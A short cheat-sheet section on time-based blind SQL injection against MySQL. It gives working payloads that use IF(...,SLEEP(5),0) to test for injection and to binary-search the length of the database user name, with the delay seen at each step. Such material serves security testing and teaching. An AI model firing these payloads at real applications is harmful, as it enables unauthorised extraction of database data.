## Time-based blind
Introduce a delay (e.g., SLEEP) only if the condition is true, allowing inference from response timing differences.

Base delay test:
' AND IF(1=1,SLEEP(5),0) --

To find length (binary search):

' AND IF(LENGTH(user())>16,SLEEP(5),0) --

(No delay)

' AND IF(LENGTH(user())>8,SLEEP(5),0) --

(No delay)

' AND IF(LENGTH(user())>4,SLEEP(5),0) --

(Delay)

' AND IF(LENGTH(user())>6,SLEEP(5),0) --

(No delay)

' AND IF(LENGTH(user())>5,SLEEP(5),0) --

(No delay)

' AND IF(LENGTH(user())=5,SLEEP(5),0) --

(Delay)

